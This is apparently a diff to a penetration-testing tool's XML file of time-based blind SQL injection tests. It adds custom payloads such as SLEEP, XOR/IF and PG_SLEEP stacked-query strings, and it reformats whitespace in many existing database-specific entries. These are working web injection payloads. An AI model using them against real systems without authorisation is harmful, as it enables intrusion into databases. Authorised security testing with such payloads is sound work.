+        <title>CUSTOM Blind-SQL time-based payload: 0'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR'Z</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]0'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR'Z</vector>
+        <request>
+            <payload>[RANDNUM]0'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR'Z</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 1234 AND SLEEP([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]1234 AND SLEEP([SLEEPTIME])</vector>
+        <request>
+            <payload>[RANDNUM]1234 AND SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (select(0)from(select(sleep([SLEEPTIME])))v)/*'+</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)/*'+</vector>
+        <request>
+            <payload>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)/*'+</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (select(0)from(select(sleep([SLEEPTIME])))v)+'"+</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)+'"+</vector>
+        <request>
+            <payload>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)+'"+</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (select(0)from(select(sleep([SLEEPTIME])))v)+"*/</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)+"*/</vector>
+        <request>
+            <payload>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)+"*/</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: '-IF(1=1,SLEEP([SLEEPTIME]),0) AND paramname='</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'-IF(1=1,SLEEP([SLEEPTIME]),0) AND paramname='</vector>
+        <request>
+            <payload>[RANDNUM]'-IF(1=1,SLEEP([SLEEPTIME]),0) AND paramname='</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ');SELECT PG_SLEEP([SLEEPTIME])--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]');SELECT PG_SLEEP([SLEEPTIME])-- </vector>
+        <request>
+            <payload>[RANDNUM]');SELECT PG_SLEEP([SLEEPTIME])-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (SELECT+1+from+pg_sleep([SLEEPTIME]))</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](SELECT+1+from+pg_sleep([SLEEPTIME]))</vector>
+        <request>
+            <payload>[RANDNUM](SELECT+1+from+pg_sleep([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <!-- Custom payload -->
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</title>
         <stype>5</stype>
@@ -23,7 +895,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</title>
         <stype>5</stype>
@@ -43,7 +914,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)</title>
         <stype>5</stype>
@@ -63,7 +933,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</title>
         <stype>5</stype>
@@ -83,7 +952,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)</title>
         <stype>5</stype>
@@ -104,7 +972,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)</title>
         <stype>5</stype>
@@ -125,7 +992,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)</title>
         <stype>5</stype>
@@ -146,7 +1012,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)</title>
         <stype>5</stype>
@@ -167,7 +1032,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)</title>
         <stype>5</stype>
@@ -187,7 +1051,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt; 5.0.12 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -207,7 +1070,6 @@
             <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK)</title>
         <stype>5</stype>
@@ -227,7 +1089,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt; 5.0.12 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -247,7 +1108,6 @@
             <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK - comment)</title>
         <stype>5</stype>
@@ -268,7 +1128,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt; 5.0.12 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -289,7 +1148,6 @@
             <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK - comment)</title>
         <stype>5</stype>
@@ -310,7 +1168,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt; 5.0.12 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -331,7 +1188,6 @@
             <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 RLIKE time-based blind</title>
         <stype>5</stype>
@@ -351,7 +1207,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)</title>
         <stype>5</stype>
@@ -372,8 +1227,7 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
-     <test>
+    <test>
         <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)</title>
         <stype>5</stype>
         <level>3</level>
@@ -389,10 +1243,9 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-             <dbms_version>&gt;= 5.0.12</dbms_version>
-       </details>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)</title>
         <stype>5</stype>
@@ -413,7 +1266,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL AND time-based blind (ELT)</title>
         <stype>5</stype>
@@ -433,7 +1285,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL OR time-based blind (ELT)</title>
         <stype>5</stype>
@@ -452,7 +1303,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>MySQL AND time-based blind (ELT - comment)</title>
         <stype>5</stype>
@@ -472,7 +1322,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>MySQL OR time-based blind (ELT - comment)</title>
         <stype>5</stype>
@@ -492,7 +1341,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 AND time-based blind</title>
         <stype>5</stype>
@@ -512,7 +1360,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 OR time-based blind</title>
         <stype>5</stype>
@@ -532,7 +1379,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 AND time-based blind (comment)</title>
         <stype>5</stype>
@@ -553,7 +1399,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 OR time-based blind (comment)</title>
         <stype>5</stype>
@@ -574,7 +1419,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -593,7 +1437,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -612,7 +1455,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -632,7 +1474,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -652,7 +1493,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase time-based blind (IF)</title>
         <stype>5</stype>
@@ -672,7 +1512,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase time-based blind (IF - comment)</title>
         <stype>5</stype>
@@ -693,7 +1532,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -713,7 +1551,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -733,7 +1570,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -754,7 +1590,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -775,7 +1610,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle AND time-based blind</title>
         <stype>5</stype>
@@ -794,7 +1628,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle OR time-based blind</title>
         <stype>5</stype>
@@ -813,7 +1646,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle AND time-based blind (comment)</title>
         <stype>5</stype>
@@ -833,7 +1665,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle OR time-based blind (comment)</title>
         <stype>5</stype>
@@ -853,7 +1684,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -872,7 +1702,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -891,7 +1720,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -911,7 +1739,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -931,7 +1758,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>IBM DB2 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -950,7 +1776,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-
     <test>
         <title>IBM DB2 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -969,7 +1794,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-
     <test>
         <title>IBM DB2 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -989,7 +1813,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-
     <test>
         <title>IBM DB2 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1009,7 +1832,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-
     <test>
         <title>SQLite &gt; 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1029,7 +1851,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>SQLite &gt; 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1049,7 +1870,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>SQLite &gt; 2.0 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1070,7 +1890,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>SQLite &gt; 2.0 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1091,7 +1910,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Firebird &gt;= 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1111,7 +1929,6 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Firebird &gt;= 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1131,7 +1948,6 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Firebird &gt;= 2.0 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1152,7 +1968,6 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Firebird &gt;= 2.0 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1173,7 +1988,6 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>SAP MaxDB AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1192,7 +2006,6 @@
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-
     <test>
         <title>SAP MaxDB OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1211,7 +2024,6 @@
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-
     <test>
         <title>SAP MaxDB AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1231,7 +2043,6 @@
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-
     <test>
         <title>SAP MaxDB OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1251,7 +2062,6 @@
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt;= 1.7.2 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1271,7 +2081,6 @@
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt;= 1.7.2 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1291,7 +2100,6 @@
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt;= 1.7.2 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1312,7 +2120,6 @@
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt;= 1.7.2 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1333,7 +2140,6 @@
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt; 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1353,7 +2159,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt; 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1373,7 +2178,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt; 2.0 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1394,7 +2198,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt; 2.0 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1415,7 +2218,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Informix AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1434,7 +2236,6 @@
             <dbms>Informix</dbms>
         </details>
     </test>
-
     <test>
         <title>Informix OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1453,7 +2254,6 @@
             <dbms>Informix</dbms>
         </details>
     </test>
-
     <test>
         <title>Informix AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1473,7 +2273,6 @@
             <dbms>Informix</dbms>
         </details>
     </test>
-
     <test>
         <title>Informix OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
@@ -1493,7 +2292,6 @@
             <dbms>Informix</dbms>
         </details>
     </test>
-
     <test>
         <title>ClickHouse AND time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1512,7 +2310,6 @@
             <dbms>ClickHouse</dbms>
         </details>
     </test>
-
     <test>
         <title>ClickHouse OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1531,9 +2328,7 @@
             <dbms>ClickHouse</dbms>
         </details>
     </test>
-
     <!-- End of time-based boolean tests -->
-
     <!-- Time-based boolean tests - Numerous clauses -->
     <!-- This payload does not work with SLEEP() -->
     <test>
@@ -1555,7 +2350,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
         <stype>5</stype>
@@ -1577,7 +2371,6 @@
         </details>
     </test>
     <!-- End of time-based boolean tests - Numerous clauses -->
-
     <!-- Time-based boolean tests - Parameter replace -->
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace</title>
@@ -1598,7 +2391,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</title>
         <stype>5</stype>
@@ -1618,7 +2410,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 time-based blind - Parameter replace (BENCHMARK)</title>
         <stype>5</stype>
@@ -1638,7 +2429,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &gt; 5.0.12 time-based blind - Parameter replace (heavy query - comment)</title>
         <stype>5</stype>
@@ -1658,7 +2448,6 @@
             <dbms_version>&gt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL time-based blind - Parameter replace (bool)</title>
         <stype>5</stype>
@@ -1677,7 +2466,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>MySQL time-based blind - Parameter replace (ELT)</title>
         <stype>5</stype>
@@ -1696,7 +2484,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
         <stype>5</stype>
@@ -1715,7 +2502,6 @@
             <dbms>MySQL</dbms>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 time-based blind - Parameter replace</title>
         <stype>5</stype>
@@ -1735,7 +2521,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1754,7 +2539,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)</title>
         <stype>5</stype>
@@ -1774,7 +2558,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <!-- Without parentesis because it never works with them, useful to exploit SQL injection in Oracle E-Business Suite Financials -->
     <test>
         <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
@@ -1794,7 +2577,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>5</stype>
@@ -1813,7 +2595,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle time-based blind - Parameter replace (heavy queries)</title>
         <stype>5</stype>
@@ -1832,7 +2613,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>SQLite &gt; 2.0 time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1852,7 +2632,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Firebird time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1872,7 +2651,6 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>SAP MaxDB time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1891,7 +2669,6 @@
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
-
     <test>
         <title>IBM DB2 time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1910,7 +2687,6 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
-
     <!-- Untested -->
     <test>
         <title>HSQLDB &gt;= 1.7.2 time-based blind - Parameter replace (heavy query)</title>
@@ -1931,7 +2707,6 @@
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt; 2.0 time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1951,7 +2726,6 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <test>
         <title>Informix time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
@@ -1971,7 +2745,6 @@
         </details>
     </test>
     <!-- End of time-based boolean tests - Parameter replace -->
-
     <!-- Time-based boolean tests - ORDER BY, GROUP BY clause -->
     <test>
         <title>MySQL &gt;= 5.0.12 time-based blind - ORDER BY, GROUP BY clause</title>
@@ -1992,7 +2765,6 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>MySQL &lt; 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)</title>
         <stype>5</stype>
@@ -2012,7 +2784,6 @@
             <dbms_version>&lt; 5.0.12</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL &gt; 8.1 time-based blind - ORDER BY, GROUP BY clause</title>
         <stype>5</stype>
@@ -2032,7 +2803,6 @@
             <dbms_version>&gt; 8.1</dbms_version>
         </details>
     </test>
-
     <test>
         <title>PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
         <stype>5</stype>
@@ -2051,7 +2821,6 @@
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-
     <test>
         <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)</title>
         <stype>5</stype>
@@ -2071,7 +2840,6 @@
             <dbms>Sybase</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)</title>
         <stype>5</stype>
@@ -2090,7 +2858,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>5</stype>
@@ -2109,7 +2876,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
         <stype>5</stype>
@@ -2128,7 +2894,6 @@
             <dbms>Oracle</dbms>
         </details>
     </test>
-
     <test>
         <title>HSQLDB &gt;= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
         <stype>5</stype>
@@ -2148,8 +2913,7 @@
             <dbms>HSQLDB</dbms>
             <dbms_version>&gt;= 1.7.2</dbms_version>
         </details>
-    </test>    
-    
+    </test>
     <test>
         <title>HSQLDB &gt; 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
         <stype>5</stype>
@@ -2169,6 +2933,5 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-
     <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
 </root>
